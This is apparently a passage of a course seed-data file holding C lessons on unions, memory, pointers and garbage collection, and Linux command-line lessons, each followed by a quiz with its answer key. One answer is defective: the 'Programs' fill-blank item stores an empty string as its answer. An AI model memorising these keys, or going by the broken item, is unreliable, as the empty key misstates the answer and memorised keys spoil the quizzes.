          options: ['1', '0', '-1', 'It is undefined'],
          answer: '0',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'You can explicitly assign a specific integer value to an enum member, like OK = 200.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Under the hood, an enum value in C is really just an ____.',
          options: [],
          answer: 'int',
        },
      ],
    },
  },
  {
    title: 'Unions',
    content: lessonContent(
      'Unions',
      `If you know TypeScript, a "union type" there means a value that could be *one of several different types* (\`string | number\`), and the compiler tracks which. A C \`union\` is a completely different, much lower-level idea: it's a block of memory that all its members **share**, one at a time.\n\n\`\`\`c\n#include <stdio.h>\n\nunion Value {\n    int asInt;\n    float asFloat;\n    char asChar[4];\n};\n\nint main(void) {\n    union Value v;\n    v.asInt = 65;\n    printf("%d\\n", v.asInt);    // 65\n    printf("%c\\n", v.asChar[0]); // 'A', same bytes read as a char\n    return 0;\n}\n\`\`\`\n\nUnlike a struct, where every member gets its **own** space (so the struct's total size is the sum of its members), a union's members all **overlap the same bytes**. Its total size is only as big as its *largest* member, because only one member is ever "live" at a time, writing to one member overwrites whatever was in the others.\n\n## Why use one?\n\nUnions save memory when you need to represent "this is either an A or a B, never both at once" without wasting space storing both. They're commonly paired with a separate "tag" field (often an enum) to remember which member is currently valid, since the union itself has no idea:\n\n\`\`\`c\nenum ValueType { TYPE_INT, TYPE_FLOAT };\n\nstruct TaggedValue {\n    enum ValueType type;\n    union {\n        int asInt;\n        float asFloat;\n    } data;\n};\n\`\`\`\n\nThis "tagged union" pattern is exactly how many interpreters and virtual machines represent dynamically-typed values internally, worth remembering, you'll build something very close to it later in this course.`
    ),
    quiz: {
      title: 'Unions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What is the size of a C union roughly equal to?",
          options: ['The sum of all its members', 'The size of its largest member', 'Always 8 bytes', 'The size of its first member only'],
          answer: 'The size of its largest member',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "A C union's members occupy separate, non-overlapping memory, similar to a struct.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Pairing a union with an enum "tag" field to remember which member is currently valid is called a ____ union.',
          options: [],
          answer: 'tagged',
        },
      ],
    },
  },
  {
    title: 'Stack and Heap',
    content: lessonContent(
      'Stack and Heap',
      `Every running C program has two very different places to put data: the **stack** and the **heap**. Understanding the difference is essential once your programs get bigger than a single function.\n\n## The stack\n\nLocal variables live on the stack, memory is claimed automatically when a function is called and freed automatically the instant it returns:\n\n\`\`\`c\n#include <stdio.h>\n\nvoid greet(void) {\n    char name[32] = "Ada"; // lives on the stack\n    printf("Hi, %s\\n", name);\n} // name's memory is reclaimed right here, automatically\n\nint main(void) {\n    greet();\n    return 0;\n}\n\`\`\`\n\nThe stack is extremely fast (allocating is just moving a pointer), but limited in size (usually a few MB) and strictly scoped, you can never return a pointer to a local stack variable and use it after the function returns, that memory is gone.\n\n## The heap\n\nThe heap is a much larger pool of memory that you manage **manually**, with \`malloc\` and \`free\`:\n\n\`\`\`c\n#include <stdlib.h>\n\nint main(void) {\n    int *numbers = malloc(10 * sizeof(int)); // ask for room for 10 ints\n    if (numbers == NULL) {\n        // malloc failed, out of memory\n        return 1;\n    }\n    numbers[0] = 42;\n    free(numbers); // you MUST free it yourself when done\n    numbers = NULL; // avoid leaving a dangling pointer around\n    return 0;\n}\n\`\`\`\n\nHeap memory survives until you explicitly \`free\` it, which is exactly what makes it useful for data that needs to outlive the function that created it, and exactly what makes it dangerous: forget to \`free\` and you leak memory, \`free\` twice or use it after freeing and you get undefined behavior.\n\n| | Stack | Heap |\n|---|---|---|\n| Managed by | The compiler, automatically | You, manually (malloc/free) |\n| Speed | Very fast | Slower |\n| Size | Small, fixed | Large, limited by system RAM |\n| Lifetime | Ends when function returns | Until you free it |\n\n> [!WARNING]\n> Forgetting to \`free\` heap memory is a **memory leak**. This is exactly the problem garbage collectors exist to solve, and exactly what you'll build one for later in this course.`
    ),
    quiz: {
      title: 'Stack and Heap Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which memory region is automatically reclaimed the instant a function returns?',
          options: ['The heap', 'The stack', 'Neither, both require manual free()', 'Both, automatically'],
          answer: 'The stack',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Memory allocated with malloc() must be freed manually with free(), it is not reclaimed automatically.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Forgetting to free heap memory that is no longer used is called a memory ____.',
          options: [],
          answer: 'leak',
        },
      ],
    },
  },
  {
    title: 'Advanced Pointers',
    content: lessonContent(
      'Advanced Pointers',
      `You thought pointers were hard? Wrong. The rest is just applying the same one idea, "a variable holding an address", one more layer deep.\n\n## Pointers to pointers\n\nA pointer can point at another pointer, useful whenever a function needs to modify **which address** the caller's pointer holds, not just the value at that address:\n\n\`\`\`c\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid allocate(int **outPtr) {\n    *outPtr = malloc(sizeof(int)); // sets the CALLER's pointer\n    **outPtr = 42;\n}\n\nint main(void) {\n    int *p = NULL;\n    allocate(&p);        // pass the address OF the pointer\n    printf("%d\\n", *p);  // 42\n    free(p);\n    return 0;\n}\n\`\`\`\n\n\`int **outPtr\` reads right-to-left: "\`outPtr\` is a pointer to (a pointer to an \`int\`)". \`*outPtr\` gives you the inner pointer, \`**outPtr\` dereferences all the way down to the \`int\` itself.\n\n## Pointers and arrays\n\nAn array name, used in most expressions, "decays" into a pointer to its first element, this is why array indexing and pointer arithmetic are interchangeable in C:\n\n\`\`\`c\n#include <stdio.h>\n\nint main(void) {\n    int scores[3] = {10, 20, 30};\n    int *p = scores;       // decays to &scores[0]\n\n    printf("%d\\n", scores[1]); // 20\n    printf("%d\\n", *(p + 1));  // 20, identical operation\n    p++;                        // now points at scores[1]\n    return 0;\n}\n\`\`\`\n\n\`p + 1\` doesn't add 1 byte, it adds \`1 * sizeof(int)\` bytes, pointer arithmetic automatically scales by the size of whatever type the pointer points to.\n\n## Function pointers\n\nA pointer can even point at executable code, letting you pass a function around like a value:\n\n\`\`\`c\n#include <stdio.h>\n\nint square(int n) { return n * n; }\n\nint apply(int (*fn)(int), int value) {\n    return fn(value);\n}\n\nint main(void) {\n    int result = apply(square, 5); // 25\n    printf("%d\\n", result);\n    return 0;\n}\n\`\`\`\n\n\`int (*fn)(int)\` declares \`fn\` as "a pointer to a function taking an \`int\` and returning an \`int\`", this is the mechanism behind callbacks in C, and it's exactly how the object system you'll build next represents dynamic behavior.\n\n> [!NOTE]\n> The in-browser interpreter running these examples doesn't support function pointer syntax, so clicking Run on the snippet above will show a parse error instead of \`25\`. The code itself is valid, standard C, you'd see it work correctly with a real compiler like \`gcc\`, this is a limitation of the lightweight interpreter, not a mistake in the example.`
    ),
    quiz: {
      title: 'Advanced Pointers Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why would a function take an int** (pointer to a pointer) parameter?',
          options: ['To make the code look more advanced', 'To modify which address the caller\'s own pointer holds', 'It is required for all malloc calls', 'To avoid using arrays'],
          answer: "To modify which address the caller's own pointer holds",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'For an int pointer p, the expression (p + 1) advances by exactly 1 byte, regardless of type.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'In most expressions, an array name automatically ____ into a pointer to its first element.',
          options: [],
          answer: 'decays',
        },
      ],
    },
  },
  {
    title: 'Stack Data Structure',
    content: lessonContent(
      'Stack Data Structure',
      `Time to combine structs and pointers into a real, reusable data structure: a **stack** (last-in, first-out), backed by the heap so it can grow.\n\n\`\`\`c\n#include <stdlib.h>\n\ntypedef struct IntStack {\n    int *items;\n    int count;\n    int capacity;\n} IntStack;\n\nstruct IntStack *stackCreate(int capacity) {\n    IntStack *s = malloc(sizeof(IntStack));\n    s->items = malloc(capacity * sizeof(int));\n    s->count = 0;\n    s->capacity = capacity;\n    return s;\n}\n\nvoid stackPush(IntStack *s, int value) {\n    if (s->count == s->capacity) return; // full, ignoring for simplicity\n    s->items[s->count] = value;\n    s->count++;\n}\n\nint stackPop(IntStack *s) {\n    s->count--;\n    return s->items[s->count];\n}\n\nvoid stackFree(IntStack *s) {\n    free(s->items); // free the array first...\n    free(s);        // ...then the struct that describes it\n}\n\`\`\`\n\n## The arrow operator\n\n\`s->items\` is shorthand for \`(*s).items\`, "dereference the pointer \`s\`, then access the \`items\` member". Since working with pointers-to-structs is so common in C, \`->\` exists purely to avoid writing \`(*s).\` everywhere.\n\n## Where does each piece live?\n\nThis is the key insight for this lesson: \`stackCreate\` allocates **two separate heap blocks**, the \`IntStack\` struct itself, and the \`items\` array it points to. They're independent allocations linked only by the pointer stored inside the struct, which is exactly why \`stackFree\` must free both, and in the right order, freeing \`s\` before \`s->items\` would leak the array's memory forever since you'd lose the only pointer to it.\n\n\`\`\`c\n#include <stdio.h>\n#include <stdlib.h>\n\ntypedef struct IntStack {\n    int *items;\n    int count;\n    int capacity;\n} IntStack;\n\nstruct IntStack *stackCreate(int capacity) {\n    IntStack *s = malloc(sizeof(IntStack));\n    s->items = malloc(capacity * sizeof(int));\n    s->count = 0;\n    s->capacity = capacity;\n    return s;\n}\n\nvoid stackPush(IntStack *s, int value) {\n    if (s->count == s->capacity) return;\n    s->items[s->count] = value;\n    s->count++;\n}\n\nint stackPop(IntStack *s) {\n    s->count--;\n    return s->items[s->count];\n}\n\nvoid stackFree(IntStack *s) {\n    free(s->items);\n    free(s);\n}\n\nint main(void) {\n    IntStack *s = stackCreate(10);\n    stackPush(s, 1);\n    stackPush(s, 2);\n    printf("%d\\n", stackPop(s)); // 2, last in, first out\n    stackFree(s);\n    return 0;\n}\n\`\`\``
    ),
    quiz: {
      title: 'Stack Data Structure Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the -> operator do?',
          options: ['Compares two pointers', 'Dereferences a pointer and accesses a member in one step', 'Allocates memory', 'Declares a function pointer'],
          answer: 'Dereferences a pointer and accesses a member in one step',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In the IntStack example, freeing the struct before freeing its items array would leak the array\'s memory.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A stack follows a "last in, first ____" ordering.',
          options: [],
          answer: 'out',
        },
      ],
    },
  },
  {
    title: 'Objects',
    content: lessonContent(
      'Objects',
      `C has no built-in "object" concept, but you can build your own object system using exactly the tools you already have: structs, tagged unions, and function pointers. This is the same foundation real language runtimes (Python's CPython, Lua's VM) are built on.\n\n\`\`\`c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\ntypedef enum {\n    OBJ_INT,\n    OBJ_STRING\n} ObjType;\n\ntypedef union {\n    int intValue;\n    char *stringValue;\n} ObjValue;\n\ntypedef struct Obj {\n    ObjType type;\n    int refCount;      // we'll use this in the next lesson\n    ObjValue as;\n} Obj;\n\nstruct Obj *objNewInt(int value) {\n    Obj *obj = malloc(sizeof(Obj));\n    obj->type = OBJ_INT;\n    obj->refCount = 1;\n    obj->as.intValue = value;\n    return obj;\n}\n\nstruct Obj *objNewString(char *value) {\n    Obj *obj = malloc(sizeof(Obj));\n    obj->type = OBJ_STRING;\n    obj->refCount = 1;\n    obj->as.stringValue = strdup(value); // heap-allocate a copy\n    return obj;\n}\n\nvoid objPrint(Obj *obj) {\n    switch (obj->type) {\n        case OBJ_INT:    printf("%d\\n", obj->as.intValue); break;\n        case OBJ_STRING:  printf("%s\\n", obj->as.stringValue); break;\n    }\n}\n\nint main(void) {\n    Obj *a = objNewInt(42);\n    Obj *b = objNewString("hello");\n    objPrint(a);\n    objPrint(b);\n    return 0;\n}\n\`\`\`\n\nThis is the **tagged union** pattern from a few lessons ago, put to real use: \`Obj\` can represent *any* value your future language or program needs, and \`type\` tells every function which union member is actually valid right now.\n\n## Why refCount is already here\n\nEvery \`Obj\` is heap-allocated (so it can outlive the function that created it and be shared around freely), which means something has to decide **when it's safe to free**. That's exactly the problem the next two lessons solve, this \`refCount\` field is the first piece of a reference-counting garbage collector, and this \`Obj\` struct is what it will manage.`
    ),
    quiz: {
      title: 'Objects Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In the Obj struct, what determines which member of the "as" union is currently valid?',
          options: ['The refCount field', 'The order the struct was declared in', 'The type field', 'Nothing, you must guess'],
          answer: 'The type field',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every Obj in this design is heap-allocated so it can be shared and outlive the function that created it.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Combining a type tag with a union to represent any kind of value is called a tagged ____.',
          options: [],
          answer: 'union',
        },
      ],
    },
  },
  {
    title: 'Refcounting GC',
    content: lessonContent(
      'Refcounting GC',
      `A garbage collector's job is simple to state and tricky to implement: automatically free heap memory once nothing needs it anymore. **Reference counting** is the simplest strategy, every \`Obj\` tracks how many places are pointing at it, and frees itself the moment that count hits zero.\n\n\`\`\`c\n#include <stdlib.h>\n\ntypedef enum { OBJ_INT, OBJ_STRING } ObjType;\n\ntypedef union {\n    int intValue;\n    char *stringValue;\n} ObjValue;\n\ntypedef struct Obj {\n    ObjType type;\n    int refCount;\n    ObjValue as;\n} Obj;\n\nvoid objRetain(Obj *obj) {\n    if (obj == NULL) return;\n    obj->refCount++;\n}\n\nvoid objRelease(Obj *obj) {\n    if (obj == NULL) return;\n    obj->refCount--;\n    if (obj->refCount == 0) {\n        if (obj->type == OBJ_STRING) {\n            free(obj->as.stringValue); // free the string data first\n        }\n        free(obj); // then the Obj itself\n    }\n}\n\`\`\`\n\nThe rule every piece of code has to follow religiously: call \`objRetain\` whenever you store a new reference to an object (assign it to another variable, put it in a list, etc.), and \`objRelease\` whenever that reference goes away.\n\n\`\`\`c\n#include <stdio.h>\n#include <stdlib.h>\n\ntypedef enum { OBJ_INT, OBJ_STRING } ObjType;\n\ntypedef union {\n    int intValue;\n    char *stringValue;\n} ObjValue;\n\ntypedef struct Obj {\n    ObjType type;\n    int refCount;\n    ObjValue as;\n} Obj;\n\nstruct Obj *objNewInt(int value) {\n    Obj *obj = malloc(sizeof(Obj));\n    obj->type = OBJ_INT;\n    obj->refCount = 1;\n    obj->as.intValue = value;\n    return obj;\n}\n\nvoid objRetain(Obj *obj) {\n    if (obj == NULL) return;\n    obj->refCount++;\n}\n\nvoid objRelease(Obj *obj) {\n    if (obj == NULL) return;\n    obj->refCount--;\n    if (obj->refCount == 0) {\n        free(obj);\n    }\n}\n\nint main(void) {\n    Obj *a = objNewInt(42);   // refCount = 1\n    Obj *b = a;\n    objRetain(b);              // refCount = 2, two owners now\n    printf("refCount: %d\\n", a->refCount);\n\n    objRelease(a);             // refCount = 1, still alive\n    printf("refCount: %d\\n", b->refCount);\n\n    objRelease(b);             // refCount = 0, freed here\n    printf("done\\n");\n    return 0;\n}\n\`\`\`\n\n## The fatal flaw: cycles\n\nRefcounting has one well-known blind spot, if object A holds a reference to B, and B holds a reference right back to A, their counts can never reach zero, even if nothing outside the pair references either of them anymore. That memory leaks forever. This isn't a bug you can patch, it's fundamental to how refcounting works, which is exactly why the next lesson introduces a completely different strategy.\n\n> [!TIP]\n> This exact tradeoff is why Python uses reference counting *plus* a supplementary cycle detector, and why some languages (like the one you're about to build a collector for) choose mark-and-sweep instead, no cycle problem, at the cost of needing to pause and scan everything periodically.`
    ),
    quiz: {
      title: 'Refcounting GC Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In reference counting, when is an object freed?',
          options: ['On a fixed timer', 'When its reference count reaches zero', 'When the program exits', 'Whenever malloc runs low on memory'],
          answer: 'When its reference count reaches zero',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Reference counting correctly frees two objects that reference each other in a cycle, even if nothing else references them.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Two objects that reference each other so their counts never reach zero form a reference ____.',
          options: [],
          answer: 'cycle',
        },
      ],
    },
  },
  {
    title: 'Mark and Sweep GC',
    content: lessonContent(
      'Mark and Sweep GC',
      `**Mark-and-sweep** takes a completely different approach from reference counting: instead of tracking counts continuously, it periodically pauses the program and asks one question directly, "starting from everything currently reachable, what's still alive?" Anything left over gets swept away.\n\nIt runs in two phases:\n\n1. **Mark**: starting from a set of "roots" (global variables, local variables currently on the stack), recursively visit every object reachable from them, flagging each one as \`marked\`.\n2. **Sweep**: walk every object the allocator has ever handed out, free any that *weren't* marked, then clear the marks for next time.\n\n\`\`\`c\n#include <stdio.h>\n#include <stdlib.h>\n\ntypedef enum { OBJ_INT, OBJ_STRING } ObjType;\n\ntypedef union {\n    int intValue;\n    char *stringValue;\n} ObjValue;\n\ntypedef struct Obj {\n    ObjType type;\n    int marked;        // replaces refCount\n    struct Obj *next;   // every object, linked so sweep can walk them all\n    ObjValue as;\n} Obj;\n\nvoid markObject(Obj *obj) {\n    if (obj == NULL || obj->marked) return; // already visited, avoid infinite loops on cycles\n    obj->marked = 1;\n    // if this object type could reference other Objs, mark those too here\n}\n\nvoid sweep(Obj **allObjects) {\n    Obj **current = allObjects;\n    while (*current != NULL) {\n        if (!(*current)->marked) {\n            Obj *unreached = *current;\n            *current = unreached->next; // unlink it\n            free(unreached);\n        } else {\n            (*current)->marked = 0; // reset for next collection\n            current = &(*current)->next;\n        }\n    }\n}\n\nint main(void) {\n    // build a small chain: a -> b, only a is reachable from our "root"\n    Obj *a = malloc(sizeof(Obj));\n    a->type = OBJ_INT;\n    a->marked = 0;\n    a->as.intValue = 1;\n\n    Obj *b = malloc(sizeof(Obj));\n    b->type = OBJ_INT;\n    b->marked = 0;\n    b->as.intValue = 2;\n\n    a->next = b;\n    b->next = NULL;\n\n    markObject(a); // b is never marked, nothing roots it\n\n    sweep(&a); // b gets freed, a survives\n\n    printf("a->as.intValue: %d\\n", a->as.intValue);\n    printf("a->next was freed and unlinked: %d\\n", a->next == NULL);\n    return 0;\n}\n\`\`\`\n\nNotice \`markObject\` checks \`obj->marked\` **before** recursing, this is exactly what solves the cycle problem from the last lesson: two objects referencing each other both simply get marked once each, then correctly swept together if nothing external points to either.\n\n## The tradeoff\n\n| | Refcounting | Mark and Sweep |\n|---|---|---|\n| Handles cycles | No | Yes |\n| Overhead | A little, on every assignment | A pause during collection |\n| Simplicity | Simpler per-operation | More bookkeeping (roots, linked list of all objects) |\n\nNeither is strictly "better", refcounting is used where memory needs to be freed the instant it's unreachable (like Swift's ARC), mark-and-sweep is used where occasional pauses are acceptable in exchange for never leaking cycles (like most JavaScript engines).\n\n## Final project\n\nCombine everything from this course: write a small C program with an \`Obj\` type (int and string, like the earlier lessons), a way to track "roots", and a working \`mark\` + \`sweep\` pair that correctly frees unreached objects, including a deliberate reference cycle to prove it doesn't leak. Submit a link to your repository below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
    quiz: {
      title: 'Mark and Sweep GC Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What are the two phases of a mark-and-sweep collector?',
          options: ['Allocate and free', 'Mark and sweep', 'Retain and release', 'Push and pop'],
          answer: 'Mark and sweep',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Mark-and-sweep correctly frees a reference cycle that nothing external points to, unlike plain refcounting.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The starting points a mark-and-sweep collector walks from (globals, the current stack) are called ____.',
          options: [],
          answer: 'roots',
        },
      ],
    },
  },
];

const linuxLessons: SeedLesson[] = [
  {
    title: 'The Command Line',
    content: lessonContent(
      'The Command Line',
      `A command-line interface (CLI) lets you control a computer by typing text commands instead of clicking through menus. It looks intimidating at first, but it's often faster and, crucially, **scriptable**: anything you can type, you can save and re-run automatically.\n\n## Why text beats clicking\n\n- A CLI command can be copy-pasted, shared, and reproduced exactly, a screenshot of "click here, then here" cannot.\n- Commands compose: the output of one command can feed directly into another (more on that soon).\n- Almost every server in the world has no graphical interface at all, the CLI isn't a retro curiosity, it's how most computing actually happens.\n\n## Your first commands\n\n\`\`\`bash\nwhoami        # who am I logged in as?\npwd           # print working directory, where am I?\necho "hi"     # print text\ndate          # current date and time\n\`\`\`\n\nEvery command follows roughly the same shape: a program name, optionally followed by **flags** (options, usually starting with \`-\`) and **arguments** (the things it operates on):\n\n\`\`\`bash\nls -l /home\n# ^command  ^flag  ^argument\n\`\`\`\n\n\`ls\` lists files, \`-l\` is a flag asking for the "long" (detailed) format, \`/home\` is the argument telling it which directory to list. You'll see this exact pattern, command, flags, arguments, in nearly every tool covered in this course.\n\n> [!TIP]\n> Stuck on what a command does or which flags it accepts? Almost every command supports \`--help\`, e.g. \`ls --help\`. That's always your first move, not memorization.`
    ),
    quiz: {
      title: 'Command Line Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main advantage of CLI commands over clicking through a GUI?',
          options: ['CLI commands always run faster on the CPU', 'They can be scripted, copied, and reproduced exactly', 'GUIs do not exist on servers', 'There is no real advantage'],
          answer: 'They can be scripted, copied, and reproduced exactly',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In "ls -l /home", -l is an argument and /home is a flag.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To see the current working directory in the terminal, you run: ____',
          options: [],
          answer: 'pwd',
        },
      ],
    },
  },
  {
    title: 'Filesystems',
    content: lessonContent(
      'Filesystems',
      `A Linux filesystem is organized as a single tree, starting from one root directory, \`/\`, with everything else nested underneath it, unlike Windows there's no separate "C:" drive.\n\n\`\`\`\n/\n├── home/\n│   └── ada/       # your personal files usually live here\n├── etc/            # system configuration files\n├── usr/            # installed programs\n└── tmp/            # temporary files, cleared periodically\n\`\`\`\n\n## Navigating\n\n\`\`\`bash\ncd /home/ada       # change directory (absolute path, starts with /)\ncd Documents       # relative path, relative to where you already are\ncd ..              # go up one level\ncd ~               # jump to your home directory\nls -la             # list files, including hidden ones (-a) with details (-l)\n\`\`\`\n\nAn **absolute path** always starts from \`/\` and works no matter where you currently are. A **relative path** is interpreted starting from your current directory, so \`cd Documents\` only works if \`Documents\` exists right where you're standing.\n\n## Managing files\n\n\`\`\`bash\nmkdir projects           # create a directory\ntouch notes.txt          # create an empty file\ncp notes.txt backup.txt  # copy\nmv notes.txt todo.txt    # rename/move\nrm backup.txt            # delete a file\nrm -r old_folder         # delete a directory and everything in it (recursive)\n\`\`\`\n\n> [!WARNING]\n> \`rm\` does **not** move files to a trash bin, it deletes them immediately and permanently. \`rm -r\` on the wrong directory is one of the most common ways people lose real work, always double-check the path before you hit enter.`
    ),
    quiz: {
      title: 'Filesystems Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does a relative path like "Documents" (without a leading /) depend on?',
          options: ['Your username', 'Your current working directory', 'The system clock', 'Nothing, it always resolves the same way'],
          answer: 'Your current working directory',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Files deleted with rm on Linux are moved to a recoverable trash/recycle bin by default.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command to create a new, empty directory is: ____ <name>',
          options: [],
          answer: 'mkdir',
        },
      ],
    },
  },
  {
    title: 'Programs',
    content: lessonContent(
      'Programs',
      `Running a program from the command line is more nuanced than it looks, the shell has to first figure out **where** the program you typed actually lives.\n\n## PATH\n\nWhen you type \`ls\`, the shell doesn't magically know where the \`ls\` program is, it searches a list of directories stored in an environment variable called \`PATH\`:\n\n\`\`\`bash\necho $PATH\n# /usr/local/bin:/usr/bin:/bin\n\nwhich ls\n# /usr/bin/ls, the first match found while searching PATH in order\n\`\`\`\n\n\`PATH\` is a colon-separated list of directories, the shell checks each one in order until it finds an executable file with that name. This is why installing a new tool sometimes requires adding its folder to \`PATH\`, otherwise typing its name does nothing but "command not found".\n\n## Running local scripts\n\nA script in your current directory is deliberately **not** found automatically, even if you're standing right next to it, this is a safety feature so a malicious file named \`ls\` sitting in a random folder can't silently hijack your commands:\n\n\`\`\`bash\n./deploy.sh     # explicit "run the file right here", the ./ is required\nbash deploy.sh  # or, explicitly hand it to the bash interpreter\n\`\`\`\n\n## Executable permission\n\nA script also needs the **executable bit** set before \`./\` will run it (more on permissions two lessons from now):\n\n\`\`\`bash\nchmod +x deploy.sh\n./deploy.sh\n\`\`\`\n\nWithout \`chmod +x\`, you'll get a "permission denied" error even though the file exists and is readable.`
    ),
    quiz: {
      title: 'Programs Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is PATH?',
          options: ['The current working directory', 'A colon-separated list of directories the shell searches for programs', 'A single file containing every installed program', 'A Linux permission level'],
          answer: 'A colon-separated list of directories the shell searches for programs',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A script in your current directory runs automatically just by typing its name, the same as a PATH command.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To run a script literally sitting in your current directory, you type ____./deploy.sh',
          options: [],
          answer: '',
        },
      ],
    },
  },
  {
    title: 'Input/Output',
    content: lessonContent(
      'Input/Output',
      `Every program has three standard I/O streams: **stdin** (input), **stdout** (normal output), and **stderr** (error output). Understanding them is what unlocks the CLI's real power, connecting simple programs together to build something bigger.\n\n## Redirection\n\n\`\`\`bash\necho "hello" > out.txt     # redirect stdout, overwrites out.txt\necho "world" >> out.txt    # append instead of overwrite\nsort < names.txt            # redirect stdin FROM a file\ncat missing.txt 2> err.log  # redirect stderr (file descriptor 2) to a file\n\`\`\`\n\n\`>\` and \`>>\` both aim a program's output at a file instead of your screen, the difference is whether it replaces or adds to existing content. \`<\` does the reverse, feeding a file's contents in as if you'd typed them.\n\n## Pipes\n\nA pipe (\`|\`) connects one program's stdout directly to the next program's stdin, no temp file needed:\n\n\`\`\`bash\ncat access.log | grep "ERROR" | wc -l\n\`\`\`\n\nRead this left to right: print the log file, filter to lines containing "ERROR", count how many lines are left. Each command does one small job well, and piping chains them into something none of them could do alone, this is the core Unix philosophy.\n\n## Arguments and flags recap\n\n\`\`\`bash\ngrep -i "error" access.log   # -i = case-insensitive flag\ngrep -c "error" access.log   # -c = count matches instead of printing them\n\`\`\`\n\nMost CLI tools accept flags to change their behavior without changing what you're fundamentally asking them to do, always check \`--help\` when you need a tool to behave slightly differently than its default.`
    ),
    quiz: {
      title: 'Input/Output Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the pipe operator (|) do?',
          options: ['Deletes both files', 'Connects one command\'s stdout to the next command\'s stdin', 'Runs two commands at the exact same instant', 'Compares two files for differences'],
          answer: "Connects one command's stdout to the next command's stdin",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Using >> instead of > appends to a file instead of overwriting it.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The three standard I/O streams every program has are stdin, stdout, and ____.',
          options: [],
          answer: 'stderr',
        },
      ],
    },
  },
  {
    title: 'Local CLI',
    content: lessonContent(
      'Local CLI',
      `Everything so far works the same in a browser-based sandbox. Real systems work involves your own machine, so this lesson is a guided tour of what to set up locally.\n\n## A real terminal, and WSL on Windows\n\nmacOS and Linux both ship with a real terminal out of the box. On Windows, install **WSL** (Windows Subsystem for Linux), which runs a genuine Linux environment alongside Windows:\n\n\`\`\`bash\nwsl --install\n\`\`\`\n\nThis gets you a real \`bash\` shell, real Linux filesystem semantics, and every command in this course working exactly as shown, rather than an approximation.\n\n## Manual pages\n\nEvery standard command ships with a full manual, more detailed than \`--help\`:\n\n\`\`\`bash\nman ls\n# space/f = next page, b = previous page, q = quit\n\`\`\`\n\n## Interactive pagers\n\nCommands like \`man\`, and tools like \`less\`, are **pagers**, they show output one screen at a time instead of dumping it all at once:\n\n\`\`\`bash\ncat huge_log.txt | less   # scroll through with arrow keys, q to quit\n\`\`\`\n\n## Processes\n\nEvery running program is a **process**, with a unique process ID (PID):\n\n\`\`\`bash\nps aux            # list running processes\ntop                # live, updating view of processes and resource use\nkill 4821          # ask a process to stop, by PID\n\`\`\`\n\n## Users, root, and sudo\n\nLinux is multi-user by design. Regular users can't modify system files or other users' data, that requires the **root** user, the one account with unrestricted access:\n\n\`\`\`bash\nwhoami             # your current user\nsudo apt update    # run one command AS root, temporarily, with a password prompt\n\`\`\`\n\n\`sudo\` ("superuser do") is how you borrow root's power for a single command without permanently logging in as root, which is exactly the safer, auditable model almost every real system uses.\n\n> [!WARNING]\n> Running everyday commands as root "just to avoid permission errors" is a common beginner habit and a real safety risk, a typo in a root shell can damage the whole system. Use \`sudo\` per-command instead.`
    ),
    quiz: {
      title: 'Local CLI Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does WSL let you do on Windows?',
          options: ['Delete Linux permanently', 'Run a real Linux environment alongside Windows', 'Compile Windows programs faster', 'Replace the Windows terminal with cmd.exe'],
          answer: 'Run a real Linux environment alongside Windows',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'sudo permanently logs you in as the root user for the rest of your session.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The one Linux account with unrestricted access to modify any file on the system is called ____.',
          options: [],
          answer: 'root',
        },
      ],
    },
  },
